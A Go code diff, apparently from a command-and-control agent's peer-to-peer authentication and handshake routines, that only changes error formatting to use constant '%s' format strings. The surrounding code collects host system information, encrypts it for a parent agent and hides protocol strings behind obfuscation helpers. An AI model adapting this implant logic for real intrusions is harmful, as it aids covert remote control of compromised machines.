@@ -20,41 +20,41 @@ func performAuth(conn *StreamConn) error {
 	// Step 1: Generate 32-byte random challenge
 	challenge := make([]byte, 32)
 	if _, err := rand.Read(challenge); err != nil {
-		return fmt.Errorf(ErrCtx(E19, err.Error()))
+		return fmt.Errorf("%s", ErrCtx(E19, err.Error()))
 	}
 
 	// Step 2: Send challenge
 	if err := conn.WriteMessage(challenge); err != nil {
-		return fmt.Errorf(ErrCtx(E11, err.Error()))
+		return fmt.Errorf("%s", ErrCtx(E11, err.Error()))
 	}
 
 	// Step 3: Read response - expect "AUTH:" + challenge
 	response, err := conn.ReadMessage()
 	if err != nil {
-		return fmt.Errorf(ErrCtx(E10, err.Error()))
+		return fmt.Errorf("%s", ErrCtx(E10, err.Error()))
 	}
 
 	// Step 4: Verify response format
 	expectedPrefix := []byte(secVal(protoAuthPrefix))
 	if len(response) != len(expectedPrefix)+len(challenge) {
-		return fmt.Errorf(Err(E2))
+		return fmt.Errorf("%s", Err(E2))
 	}
 
 	for i, b := range expectedPrefix {
 		if response[i] != b {
-			return fmt.Errorf(Err(E3))
+			return fmt.Errorf("%s", Err(E3))
 		}
 	}
 
 	for i, b := range challenge {
 		if response[len(expectedPrefix)+i] != b {
-			return fmt.Errorf(Err(E3))
+			return fmt.Errorf("%s", Err(E3))
 		}
 	}
 
 	// Step 5: Send "OK" confirmation
 	if err := conn.WriteMessage([]byte(secVal(protoAuthOk))); err != nil {
-		return fmt.Errorf(ErrCtx(E11, err.Error()))
+		return fmt.Errorf("%s", ErrCtx(E11, err.Error()))
 	}
 
 	return nil
@@ -66,7 +66,7 @@ func performHandshake(conn *StreamConn, config map[string]string) error {
 	// Collect system information
 	sysInfo, err := collectSystemInfo(clientID)
 	if err != nil {
-		return fmt.Errorf(ErrCtx(E19, err.Error()))
+		return fmt.Errorf("%s", ErrCtx(E19, err.Error()))
 	}
 
 	// Encrypt system info with RSA+AES (same as HTTPS/SMB agent handshake)
@@ -75,7 +75,7 @@ func performHandshake(conn *StreamConn, config map[string]string) error {
 
 	encryptedPayload, err := encryptHandshakePayload(sysInfo, publicKey, initSecret)
 	if err != nil {
-		return fmt.Errorf(ErrCtx(E19, err.Error()))
+		return fmt.Errorf("%s", ErrCtx(E19, err.Error()))
 	}
 
 	// Create handshake message to send through the parent agent
@@ -86,12 +86,12 @@ func performHandshake(conn *StreamConn, config map[string]string) error {
 
 	msgJSON, err := json.Marshal(handshakeMsg)
 	if err != nil {
-		return fmt.Errorf(ErrCtx(E18, err.Error()))
+		return fmt.Errorf("%s", ErrCtx(E18, err.Error()))
 	}
 
 	// Send handshake through the connection
 	if err := conn.WriteMessage(msgJSON); err != nil {
-		return fmt.Errorf(ErrCtx(E11, err.Error()))
+		return fmt.Errorf("%s", ErrCtx(E11, err.Error()))
 	}
 
 	// Wait for handshake response with timeout
@@ -130,31 +130,31 @@ func performHandshake(conn *StreamConn, config map[string]string) error {
 		// NOTE: Parent agent sends "payload" (not "pl") for the payload field
 		var respEnvelope map[string]interface{}
 		if err := json.Unmarshal(response, &respEnvelope); err != nil {
-			return fmt.Errorf(ErrCtx(E18, err.Error()))
+			return fmt.Errorf("%s", ErrCtx(E18, err.Error()))
 		}
 
 		respType, _ := respEnvelope[secVal(protoKeyType)].(string)
 		if respType != secVal(protoTypeHsResp) {
-			return fmt.Errorf(Err(E2))
+			return fmt.Errorf("%s", Err(E2))
 		}
 
 		respPayloadStr, _ := respEnvelope[secVal(protoKeyPayload)].(string)
 		respBytes, err := base64.StdEncoding.DecodeString(respPayloadStr)
 		if err != nil {
-			return fmt.Errorf(ErrCtx(E18, err.Error()))
+			return fmt.Errorf("%s", ErrCtx(E18, err.Error()))
 		}
 
 		var signedResp VResp
 		if err := json.Unmarshal(respBytes, &signedResp); err != nil {
-			return fmt.Errorf(ErrCtx(E18, err.Error()))
+			return fmt.Errorf("%s", ErrCtx(E18, err.Error()))
 		}
 
 		if err := verifyServerSignature(&signedResp, publicKey); err != nil {
-			return fmt.Errorf(ErrCtx(E3, err.Error()))
+			return fmt.Errorf("%s", ErrCtx(E3, err.Error()))
 		}
 
 		if signedResp.NNID == "" {
-			return fmt.Errorf(Err(E4))
+			return fmt.Errorf("%s", Err(E4))
 		}
 		clientID = signedResp.NNID
 
@@ -186,10 +186,10 @@ func performHandshake(conn *StreamConn, config map[string]string) error {
 		return nil
 
 	case err := <-errChan:
-		return fmt.Errorf(ErrCtx(E12, err.Error()))
+		return fmt.Errorf("%s", ErrCtx(E12, err.Error()))
 
 	case <-time.After(300 * time.Second):
-		return fmt.Errorf(Err(E6))
+		return fmt.Errorf("%s", Err(E6))
 	}
 }
 
